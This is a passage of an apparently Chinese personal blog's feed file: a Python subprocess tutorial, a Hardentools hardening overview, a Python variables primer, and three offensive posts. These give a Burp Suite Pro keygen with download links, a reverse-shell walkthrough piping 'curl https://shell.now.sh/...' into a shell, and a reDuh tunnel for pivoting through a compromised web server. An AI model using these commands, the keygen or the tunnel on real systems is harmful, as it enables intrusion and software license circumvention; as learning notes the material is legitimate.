failed:”, e, file=sys.stderr)</p></blockquote><h3 id="getstatusoutput-getoutput"><a href="#getstatusoutput-getoutput" class="headerlink" title="getstatusoutput/getoutput"></a>getstatusoutput/getoutput</h3><blockquote><p>&nbsp;  &gt;&gt;&gt; subprocess.getstatusoutput(‘ls /bin/ls’)</p></blockquote><blockquote><p>(0, ‘/bin/ls’)</p></blockquote><blockquote><p>&nbsp;&gt;&gt;&gt; subprocess.getoutput(‘ls /bin/ls’)</p></blockquote><blockquote><p>‘/bin/ls’</p></blockquote><p>详细可以查阅<code>Python 3</code>官方文档：</p><ul><li><p>os: <a href="https://docs.python.org/3/library/os.html" target="_blank" rel="noopener">https://docs.python.org/3/library/os.html</a></p></li><li><p>subprocess: <a href="https://docs.python.org/3/library/subprocess.html" target="_blank" rel="noopener">https://docs.python.org/3/library/subprocess.html</a></p></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fo9eb6x7uyj31240o0jsi.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>subprocess模块+去除启动的黑色cmd窗口</title>
+    <link href="http://yoursite.com/2018/02/08/subprocess%E6%A8%A1%E5%9D%97+%E5%8E%BB%E9%99%A4%E5%90%AF%E5%8A%A8%E7%9A%84%E9%BB%91%E8%89%B2cmd%E7%AA%97%E5%8F%A3/"/>
+    <id>http://yoursite.com/2018/02/08/subprocess模块+去除启动的黑色cmd窗口/</id>
+    <published>2018-02-08T12:02:42.000Z</published>
+    <updated>2018-08-05T06:36:17.521Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo9d9sak0tj30lp05yaa1.jpg" alt=""></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天xz跟我说了<code>subprocess</code>模块，正好我晚上就用了<code>subprocess</code>模块。</p><p>我们能从<code>Python</code>官方文档里读到应该用<code>subprocess</code> 模块来运行系统命令<code>.subprocess</code>模块允许我们创建子进程,连接他们的输入/输出/错误管道，还有获得返回值。<br><code>subprocess</code>模块打算来替代几个过时的模块和函数，比如： <code>os.system</code>,<code>os.spawn*</code>, <code>os.popen*</code>, <code>popen2.*</code>命令。<br>让我们来看一下<code>subprocess</code>有哪些不同的函数.</p><h3 id="subprocess-call"><a href="#subprocess-call" class="headerlink" title="subprocess.call()"></a>subprocess.call()</h3><p>执行由参数提供的命令.<br>我们可以用数组作为参数运行命令,也可以用字符串作为参数运行命令(通过设置参数<code>shell=True</code>)<br>注意,参数<code>shell</code>默认为<code>False</code><br>我们用<code>subprocess.call()</code>来做一个统计磁盘的例子:</p><blockquote><p>subprocess.call([‘df’, ‘-h’])</p></blockquote><p>下面的例子把<code>shell</code>设置为<code>True</code></p><blockquote><p>subprocess.call(‘du -hs $HOME’, shell=True)</p></blockquote><p>注意<code>python</code>官方文档里对参数<code>shell=True</code>陈述了一个警告:</p><blockquote><p>Invoking the system shell with shell=True can be a security hazard if combined<br>with untrusted input</p></blockquote><h4 id="Input-and-Output"><a href="#Input-and-Output" class="headerlink" title="Input and Output"></a>Input and Output</h4><p><code>subprocess</code> 模块能阻止输出,当你不关心标准输出的时候是非常方便的.<br>它也使你通过一种正确的方式管理输入/输出,有条理地整合<code>python</code>脚本中的的<code>shell</code>命令.</p><h4 id="Return-Codes"><a href="#Return-Codes" class="headerlink" title="Return Codes"></a>Return Codes</h4><p>通过<code>subprocess.call</code>的返回值你能够判定命令是否执行成功.<br>每一个进程退出时都会返回一个状态码，你可以根据这个状态码写一些代码。</p><h4 id="stdin-stdout-and-stderr"><a href="#stdin-stdout-and-stderr" class="headerlink" title="stdin, stdout and stderr"></a>stdin, stdout and stderr</h4><p>我在使用<code>subprocess</code> 时,有一个微妙的部分是怎么使用管道把命令连接起来.<br>管道表明一个新的子管道应该被创建.<br>默认的设置为<code>None,</code>意味着没有重定向发生<br>标准错误可以指向标准输出,表明子进程的错误信息会被捕获到和标准输出同一个文件.</p><h3 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h3><p><code>subprocess</code>模块中基本的进程创建和管理由Popen 类来处理.<br><code>subprocess.popen</code>是用来替代<code>os.popen</code>的.<br>我们来做一些真实的例子,<code>subprocess.Popen</code>需要一个数组作为参数:</p><blockquote><p>import subprocess</p></blockquote><blockquote><p>p = subprocess.Popen([“echo”, “hello world”], stdout=subprocess.PIPE)</p></blockquote><blockquote><p>print p.communicate()</p></blockquote><blockquote><p> &nbsp;&gt;&gt;&gt;(‘hello world<br>‘, None)</p></blockquote><p>注意,虽然你可以使用 “<code>shell=True</code>“,但并不推荐这样的方式.<br>如果你知道你只用几个有限的函数,比如<code>Popen</code>和<code>PIPE</code>,你可以单单指定这几个函数:</p><blockquote><p>from subprocess import Popen, PIPE</p></blockquote><blockquote><p>p1 = Popen([“dmesg”], stdout=PIPE)</p></blockquote><blockquote><p>print p1.communicate()</p></blockquote><h4 id="Popen-communicate"><a href="#Popen-communicate" class="headerlink" title="Popen.communicate()"></a>Popen.communicate()</h4><p><code>communicate()</code>函数返回一个<code>tuple</code>(标准输出和错误).<br><code>Popen.communicate()</code> 和进程沟通:发送数据到标准输入.从标准输出和错误读取数据直到遇到结束符.等待进程结束.<br>输入参数应该是一个字符串,以传递给子进程,如果没有数据的话应该是<code>None</code>.<br>基本上,当你用<code>communicate()函</code>数的时候意味着你要执行命令了.</p><h3 id="用subprocess写Ping程序"><a href="#用subprocess写Ping程序" class="headerlink" title="用subprocess写Ping程序"></a>用subprocess写Ping程序</h3><p>我们先问用户地址,然后用<code>ping</code>请求这个地址.</p><blockquote><p>&nbsp;# Import the module</p></blockquote><blockquote><p>&nbsp;import subprocess</p></blockquote><blockquote><p>&nbsp;# Ask the user for input</p></blockquote><p>host = raw_input(“Enter a host to ping: “)    </p><blockquote><p>&nbsp;# Set up the echo command and direct the output to a pipe</p></blockquote><blockquote><p>&nbsp;p1 = subprocess.Popen([‘ping’, ‘-c 2’, host], stdout=subprocess.PIPE)</p></blockquote><blockquote><p>&nbsp;# Run the command</p></blockquote><blockquote><p>output = p1.communicate()[0]</p></blockquote><blockquote><p>print output</p></blockquote><h3 id="去除启动的黑色cmd窗口"><a href="#去除启动的黑色cmd窗口" class="headerlink" title="去除启动的黑色cmd窗口"></a>去除启动的黑色cmd窗口</h3><p>开始我用的<code>o</code>s模块的<code>os.system（）</code>，但是发现有一个<code>bug</code>。<br>就是启动之后会有黑色的<code>cmd</code>窗口这个<code>bug</code>，这个不是我们想要的。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fo9d27zmykj30rl0ef3z2.jpg" alt=""></p><p>于是我查了查资料，看到了这个。<br><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo9d6x8ebpj30r406oaaf.jpg" alt=""></p><p>原来我们可以使用<code>subprocess</code>模块的<code>subprocess.Popen()</code>来解决这个<code>bug</code>。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo9d9sak0tj30lp05yaa1.jpg" alt=""></p><p>这下启动之后出现的黑色<code>cmd</code>窗口没有了，也达到我们的效果。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo9dc29cubj30dl094jrq.jpg" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>了解了<code>subproess</code>模块</p></li><li><p>学会了用<code>subproess`</code>模块的subpross.Popen()<code>解决启动的黑色</code>cmd`窗口。</p></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fo9d9sak0tj30lp05yaa1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hardentools</title>
+    <link href="http://yoursite.com/2018/02/08/Hardentools/"/>
+    <id>http://yoursite.com/2018/02/08/Hardentools/</id>
+    <published>2018-02-08T05:25:29.000Z</published>
+    <updated>2018-08-05T06:36:17.517Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo8zc77g9pj30h40fq0tf.jpg" alt=""><br><a id="more"></a></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo8zcleuusj303k03k0sl.jpg" alt=""></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于本人现在主要用Windows,又比较注重安全性，有一次跟<code>demon</code>讨论如何对<code>Windows</code>系统进行安全加固，他说最好禁用<code>Powershell</code>和<code>.net</code>。那天正好看见他分享了这个工具，可以一键禁用<code>Powershell</code> 。</p><h3 id="Hardentools"><a href="#Hardentools" class="headerlink" title="Hardentools"></a>Hardentools</h3><p><code>Hardentools</code>是一个简单的实用程序，旨在禁用操作系统（<code>Microsoft Windows</code>）以及主要应用程序公开的许多“功能”。这些通常为企业客户所设想的功能，对于普通用户来说通常是无用的，而且由于攻击者非常普遍地滥用其在受害者的计算机上执行恶意代码而构成危险。这个工具的目的是通过禁这些无用的功能来减少攻击面。<code>Hardentools</code>适用于有风险的个人，他们可能希望以某种可用性为代价获得额外的安全级别。它不适用于企业环境。</p><blockquote><p>警告：这只是一个实验，它并不意味着公开使用。此外，此工具会禁用许多功能，包括<code>Microsoft Office</code>，<code>Adobe Reader</code>和<code>Windows</code>，这些功能可能会导致某些应用程序出现故障。使用这个需要您自担风险。</p></blockquote><p>请记住，在运行<code>Hardentools</code>之后，例如，您将无法使用<code>Microsoft Office Excel</code>或使用命令行终端进行复杂的计算，但这些几乎是唯一具有稍微更安全的<code>Windows</code>的“缺点”环境。</p><p><code>github</code>项目地址：<br><a href="https://github.com/securitywithoutborders/hardentools" target="_blank" rel="noopener">https://github.com/securitywithoutborders/hardentools</a></p><h3 id="如何使用它"><a href="#如何使用它" class="headerlink" title="如何使用它"></a>如何使用它</h3><p>一旦你双击图标，根据你的<code>Windows</code>安全设置，你应该被提示用户访问控制对话框，要求你确认以允许<code>Hardentools</code>运行。点击“是”。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo8zgimtbej30de07wjrm.jpg" alt=""></p><p>然后，你会看到主要的<code>Hardentools</code>窗口。这很简单，只需点击“强化”按钮，该工具将对<code>Windows</code>配置进行更改，以禁用一组有风险的功能。一旦完成，您将被要求重新启动您的计算机进行所有更改才能生效。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo8zhf8ysdj30h40fq0tf.jpg" alt=""></p><p>如果您希望恢复原始设置并还原<code>Hardentools</code>所做的更改（例如，如果您需要使用<code>cmd.exe</code>），则可以简单地重新运行该工具，系统会提示您一个“恢复”按钮。同样，单击它并等待修改被还原。</p><p>请注意：由<code>Hardentools</code>所做的修改仅仅是用于运行该工具的<code>Windows</code>用户帐户的上下文。如果你想<code>Hardentools</code>也改变其他<code>Windows</code>用户的设置，你将不得不从其中每一个登录运行它。</p><h3 id="这个工具不是什么"><a href="#这个工具不是什么" class="headerlink" title="这个工具不是什么"></a>这个工具不是什么</h3><ul><li>它不会阻止软件被利用。</li><li>它不能防止滥用每一个可用的危险功能。</li><li>这不是一个杀毒软件。它不保护你的电脑。它不识别，阻止或删除任何恶意软件。</li><li>它不会阻止它实现的变化被还原。如果恶意代码在系统上运行，并且能够恢复它们，工具的效果就失效了，不是吗？</li></ul><h3 id="禁用的功能"><a href="#禁用的功能" class="headerlink" title="禁用的功能"></a>禁用的功能</h3><h4 id="通用Windows功能"><a href="#通用Windows功能" class="headerlink" title="通用Windows功能"></a>通用Windows功能</h4><ul><li><p>禁用<code>Windows</code>脚本主机。<code>Windows Script Host</code>允许在<code>Windows</code>操作系统上执行<code>VBScript</code>和<code>Javascript</code>文件。这是常见的恶意软件（如勒索软件）以及有针对性的恶意软件常用的。</p></li><li><p>禁用自动运行和自动播放。禁用所有设备的自动运行/自动播放。例如，这可以防止应用程序在将<code>USB</code>设备插入计算机时自动执行。</p></li><li><p>通过<code>Windows</code>资源管理器禁用<code>powershell.exe</code>，<code>powershell_ise.exe</code>和<code>cmd.exe</code>执行。您将无法使用该终端，并且应该阻止恶意代码尝试感染系统来使用<code>PowerShell</code>。</p></li><li><p>将用户帐户控制（<code>UAC</code>）设置为始终要求许可（即使只是更改配置）并使用“安全桌面”。</p></li><li><p>禁用主要用于恶意目的的文件扩展名。禁用<code>.hta</code>，<code>.js</code>，<code>.JSE</code>，<code>.WSH</code>，<code>.WSF</code>，<code>.scf</code>，<code>.scr</code>，<code>.vbs</code>，<code>.vbe</code>，<code>.pif</code> “当前用户的文件扩展名（以及系统范围的默认设置，只对新创建的用户有用）。</p></li></ul><h4 id="微软办公软件"><a href="#微软办公软件" class="headerlink" title="微软办公软件"></a>微软办公软件</h4><ul><li><p>禁用宏。有时，<code>Microsoft Office</code>用户使用宏来脚本化和自动化某些活动，特别是使用<code>Microsoft Excel</code>进行的计算。然而，宏目前是安全瘟疫，并被广泛用作妥协的工具。使用<code>Hardentools</code>，宏被禁用，并且“启用此内容”通知也被禁用，以防止用户被欺骗。</p></li><li><p>禁用<code>OLE</code>对象执行。<code>Microsoft Office</code>应用程序能够嵌入所谓的“<code>OLE</code>对象”并执行它们，有时也会自动（例如通过PowerPoint动画）。也可以将<code>Windows</code>可执行文件（如间谍软件）作为对象进行嵌入和执行。这也是我们一次又一次地观察到的安全灾难，特别是在对被压迫地区的激进分子的袭击中。<code>Hardentools</code>完全禁用了这个功能。</p></li><li><p>禁用<code>ActiveX</code>。禁用所有<code>Office</code>应用程序的<code>ActiveX</code>控件。</p></li><li><p>禁用<code>DDE</code>。为<code>Word</code>和<code>Excel</code>禁用<code>DDE</code>。</p></li></ul><h4 id="爱看阅读器"><a href="#爱看阅读器" class="headerlink" title="爱看阅读器"></a>爱看阅读器</h4><ul><li>在<code>PDF</code>文档中禁用<code>JavaScript</code>。<code>Acrobat Reader</code>允许从<code>PDF</code>文档执行<code>JavaScript</code>代码。这被广泛滥用于利用和恶意活动。</li></ul><p>禁止执行嵌入在<code>PDF</code>文档中的对象。<code>Acrobat Reade</code>r也允许通过打开它们来执行嵌入的对象。这通常会引发安全警报，但鉴于这种合法使用是罕见且有限的，<code>Hardentools</code>禁用此功能。</p><ul><li><p>打开保护模式（在当前版本中默认启用）</p></li><li><p>打开受保护的视图，查看来自不受信任来源的所有文件</p></li><li><p>打开增强安全性（在当前版本中默认启用）</p></li></ul><h3 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h3><p>这个工具由<code>Claudio Guarnieri</code>，<code>Mariano Graziano</code>和<code>Florian Probst</code>开发。</p><p>参考：<a href="https://github.com/securitywithoutborders/hardentools" target="_blank" rel="noopener">https://github.com/securitywithoutborders/hardentools</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fo8zc77g9pj30h40fq0tf.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="tools" scheme="http://yoursite.com/categories/tools/"/>
+    
+    
+      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Burp Suite Pro Loader&amp;Keygen By surferxyz 1.7.32</title>
+    <link href="http://yoursite.com/2018/02/06/Burp%20Suite%20Pro%20Loader&amp;Keygen%20By%20surferxyz%201.7.31/"/>
+    <id>http://yoursite.com/2018/02/06/Burp Suite Pro Loader&amp;Keygen By surferxyz 1.7.31/</id>
+    <published>2018-02-05T16:27:32.000Z</published>
+    <updated>2018-08-05T06:36:17.517Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo62jdz5zdj30n50c1wfz.jpg" alt=""><br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看到小伙伴都会用了，本不想写，无奈<code>1.7.32</code>又出来了，写一下吧。</p><p><code>surferxy</code>z发布在<code>EXETOOLS</code>，地址：<code>https://forum.exetools.com/showpost.php?p=112008&amp;postcount=83</code>，原文如下（内容转自吾爱破解）#</p><blockquote><p>made a loader/keygen that should work on future versions of burp suite pro, unless they specifically target it/change the license scheme.</p></blockquote><blockquote><p>Download loader/keygen here: <a href="http://www36.zippyshare.com/v/WRy3bGWf/file.html" target="_blank" rel="noopener">http://www36.zippyshare.com/v/WRy3bGWf/file.html</a></p></blockquote><blockquote><p>Works on 1.6.x up until the latest version 1.7.31 and maybe into the future ;-)</p></blockquote><blockquote><p>My approach is a bit different than larry_lau, and my jar is not obfuscated so you can easily verify that it is safe :-)</p></blockquote><blockquote><p>You still probably need to firewall off the program like Sakaroz said, if it really does do license callbacks. (I didnt look)</p></blockquote><p><code>surferxyz</code>提供的<code>Loader&amp;Keygen</code>程序没有混淆，可以完整看到<code>burp</code>的注册算法，并且<code>loader</code>的思路相当赞，注册机 通杀<code>1.6.x</code>到最新的<code>1.7.32</code>版 ，以后你有新版本也可以直接使用这个注册机#<br>程序使用很简单，可以直接打开<code>burp-loader-keygen.jar</code>即可，如果不行可以使用命令行启动：<br>    <code>java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.31.jar</code></p><p><code>Burp Suite Pro Loader&amp;Keygen By surferxyz 1.7.31</code>下载链接：</p><blockquote><p><a href="https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v1.7.32_Loader_Keygen.zip" target="_blank" rel="noopener">https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v1.7.32_Loader_Keygen.zip</a></p></blockquote><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>打开<code>burp-loader-keygen.jar</code>,然后点击运行<code>run</code>。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo62pcxbz9j30mo0crq3p.jpg" alt=""></p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>把<code>burp-loader-keygen License</code>里面的<code>key</code>复制到<code>burp</code>里面，然后<code>next</code>。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo62ry5lstj311f0jnq4a.jpg" alt=""></p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>复制<code>burp</code>里的<code>request</code>那部分数据复制到<code>burp-loader-keygen</code>的<code>Activation Resqust</code>里面，然后程序会自动在<code>Activation Response</code>生成一个序列号，把生成出来的序列号复制到<code>burp</code>里的<code>response</code>里，然后<code>next</code>。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo62xlbs0ij31h70mo41d.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo62yiwephj30zk0k83zo.jpg" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fo62jdz5zdj30n50c1wfz.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="tools" scheme="http://yoursite.com/categories/tools/"/>
+    
+    
+      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>reverse-shell</title>
+    <link href="http://yoursite.com/2018/02/03/reverse-shell/"/>
+    <id>http://yoursite.com/2018/02/03/reverse-shell/</id>
+    <published>2018-02-03T06:26:37.000Z</published>
+    <updated>2018-08-05T06:36:17.521Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo3avdpsuqj30rl0efmx7.jpg" alt=""><br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>将<code>Shell</code>作为服务反向 - <code>https://shell.now.sh</code></p><p>在大多数类<code>Unix</code>系统上都可以使用的反向<code>shell</code>。</p><p>检测目标上的可用软件并运行适当的有效负载。</p><p>因为这是一个反向连接，所以它可以穿过防火墙并连接到互联网。</p><p><code>github</code>项目地址：<br><a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener">https://github.com/lukechilds/reverse-shell</a></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="1、监听端口"><a href="#1、监听端口" class="headerlink" title="1、监听端口"></a>1、监听端口</h4><pre><code>nc -lvvp 6666</code></pre><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo3asm9s45j30rl0efweg.jpg" alt=""></p><h4 id="2、在目标上执行反向shell"><a href="#2、在目标上执行反向shell" class="headerlink" title="2、在目标上执行反向shell"></a>2、在目标上执行反向shell</h4><pre><code>curl https://shell.now.sh/主机名或者ip:6666 | SH</code></pre><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo3aurqh80j30ho04gq2v.jpg" alt=""></p><h4 id="3、得到shell"><a href="#3、得到shell" class="headerlink" title="3、得到shell"></a>3、得到shell</h4><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo3avdpsuqj30rl0efmx7.jpg" alt=""></p><p><strong>总结：</strong></p><ul><li>学会了反向<code>shell</code></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fo3avdpsuqj30rl0efmx7.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="tools" scheme="http://yoursite.com/categories/tools/"/>
+    
+    
+      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python学习之变量</title>
+    <link href="http://yoursite.com/2018/01/30/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%98%E9%87%8F/"/>
+    <id>http://yoursite.com/2018/01/30/python学习之变量/</id>
+    <published>2018-01-30T13:05:07.000Z</published>
+    <updated>2018-08-05T06:36:17.521Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo3b8r4r4wj30rf0l5wib.jpg" alt=""></p><a id="more"></a><h4 id="变量简述"><a href="#变量简述" class="headerlink" title="变量简述"></a>变量简述</h4><p>变量就是存储计算机程序中数据的容器。</p><p>有了变量，程序中的赋值操作将变得不那么繁琐，而且更加方便。<br>不仅仅是赋值操作，变量可以用在所有需要动态变化的参数中。<br>我个人理解就是变量是动态变化的量，可以用来存储数据。</p><pre><code>#/usr/bin/env pythonnum = 12print(num+1)</code></pre><p>查看变量类型可以用<code>type</code>函数</p><pre><code>num = 18str = &quot;hello python&quot;print(type(num))print(type(str))</code></pre><h4 id="变量的类型"><a href="#变量的类型" class="headerlink" title="变量的类型"></a>变量的类型</h4><p><code>python</code>是动态类型语言，定义变量的时候可以不需要指定变量类型，可以根据后面的数据推断出类型，这虽然变得方便了，但是存在不安全的因素，<code>php</code>也是，都属于弱类型语言。</p><p><code>c</code>,<code>c++</code>,<code>c#</code>，<code>java</code>都属于静态类型语言，定义变量的时候需要指定变量类型，没法根据后面的数据推断出类型，这种相对动态类型语言来说是比较安全的。属于强类型语言。</p><p><code>Numbers</code> (数字)</p><ul><li><code>int</code>  （有符号整形）</li><li><code>long</code>长整形 （<code>python3</code>已不使用）</li><li><code>float</code> (浮点数)</li><li>c<code>omplex</code>(复数)</li></ul><p>布尔类型</p><ul><li><code>True</code> (真)</li><li><code>False</code> (假)</li></ul><p><code>String</code>(字符串)</p><p><code>List</code>(列表)</p><p><code>Tuple</code> (元组)</p><p><code>Dictionary</code>(字典)</p><p>干什么事都需要用合适的变量类型，例如修三峡大坝就应该用下图中的那辆大的、高的车辆，而用那辆小的<code>SUV</code>就明显不合适了，而如果是在普通公路上驾驶及行驶，那这辆<code>SUV</code>就再适合不过了。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fo3b8r4r4wj30rf0l5wib.jpg" alt=""></p><p><strong>总结：</strong></p><ul><li>了解了python变量的基本概念</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fo3b8r4r4wj30rf0l5wib.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>内网渗透之reDuh</title>
+    <link href="http://yoursite.com/2018/01/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BreDuh/"/>
+    <id>http://yoursite.com/2018/01/28/内网渗透之reDuh/</id>
+    <published>2018-01-28T06:19:58.000Z</published>
+    <updated>2018-08-05T06:36:17.525Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwbl9mn08j30ic0hbmxk.jpg" alt=""></p><a id="more"></a><h3 id="reDuh原理介绍"><a href="#reDuh原理介绍" class="headerlink" title="reDuh原理介绍"></a>reDuh原理介绍</h3><p><code>reDuh</code>最开始是由<code>SensePost</code>在<code>BlackHat USA 2008</code>会议上发表的一个议题中的一部分。它的出现是针对当前Web安全渗透测试经常会面临的一个问题，同时也是<code>Web</code>服务器加固方面一个很重要的部分， 那就是<code>Web</code>服务器对外只开放一个<code>80</code>端口。<code>Web</code>服务器的安全防护可以是操作系统的端口定制或者是网管防火前的端口定制。这时渗透测试人员如果想进一步 测试内网的话必须先拿下目标服务器并拥有一定的控制权限。<code>reDuh GUI</code>是由诺赛科技从原有的JAVA语言上移植到C++语言的一个<code>Windows GUI</code>版本，具有如下一些特性：</p><p>不需要<code>JAVA</code>运行环境<br>可视化操作<br>支持<code>HTTP/HTTPS</code><br>支持二级代理<br>以前渗透测试人员常用的一些方法是通过上传一些针对操作系统的可执行文件到目标服务器，并且必须要通过进程的方式执行该程序。这就存在两个问题：1、通过 渗透测试拿到的权限不一定允许执行进程；2、目标服务器的种类可能很多，比如<code>Windows、Linux、Solaris</code>等等，且对于库依赖性比较强，这 样就要求渗透测试人员必须维护一个不小的程序库以满足渗透测试的场景。<br>事实上，我们容易忽略的一点就是，其实脚本代码本身就支持<code>SOCKET</code>套接字的操作，它完全可以制作成为一个<code>SOCKET</code>中转代理（当然这也是有一定的限 制的，就比如在PHP中需要启用<code>SOCKET</code>模块）。那么这种代理是可以直接绕过防火墙进入到内网的。我们举个现实生活中比较常见的例子说明：<code>A</code>是一台<code>web</code>服务器，<code>B</code>是与<code>A</code>在同一内网一个文件服务器，由于工作需要及简化操作，<code>B</code>的文件访问是对内网公开的，也就是没有任何的认证要求。同时为了保证<code>B</code>服务 器的安全性，在网关防火墙上做了端口过滤：只允许外网访问<code>A</code>的<code>80</code>端口。这时我们如果想要从测试点访问<code>B</code>，传统的做法是控制<code>A</code>，上传执行文件，做一个程序 级的端口转发器。假设目标服务器根本就不允许从<code>web</code>上来的请求执行程序，换句话说是不允许执行进程，那么我们就没有办法拿到<code>B</code>的文件了吗？这里，我们就 可以想到<code>reDuh</code>了。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwawsjj4vj30gy09taaj.jpg" alt=""></p><p>由图示上我们也可以看出，从<code>MSTSC</code>客户端到目标的<code>Terminal</code>服务器中间其实是走了一个这样的流程：<br><code>Mstsc</code>客户端–&gt;<code>reDuh</code>代理–&gt;<code>HTTP tunne</code>–&gt;<code>Web</code>服务器–&gt;<code>Terminal</code>服务器<br>当然，对于<code>MSTSC</code>客户端而言，这些过程都是透明的，我们只需要在<code>MSTSC</code>中指定连接的端口为本地<code>reDuh</code>监听的端口即可。</p><h3 id="首先我们上传reDuh脚本"><a href="#首先我们上传reDuh脚本" class="headerlink" title="首先我们上传reDuh脚本"></a>首先我们上传reDuh脚本</h3><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwb20f3l3j30gt035mx1.jpg" alt=""></p><p>文件可以访问，继续下一步。</p><h3 id="然后我们配置好代理端"><a href="#然后我们配置好代理端" class="headerlink" title="然后我们配置好代理端"></a>然后我们配置好代理端</h3><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwb4ym17nj30fn0bb0sq.jpg" alt=""></p><h3 id="最后我们开始通过reDuh转发进内网"><a href="#最后我们开始通过reDuh转发进内网" class="headerlink" title="最后我们开始通过reDuh转发进内网"></a>最后我们开始通过reDuh转发进内网</h3><p>可以看到，成功转发。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwbakn8c8j30if0hagly.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwbl9mn08j30ic0hbmxk.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwbmcfy97j30fl0b93yo.jpg" alt=""></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li>还有很多姿势有待我们去挖掘</li></ul>]]></content>
+    
+    <summary type="html">
+    
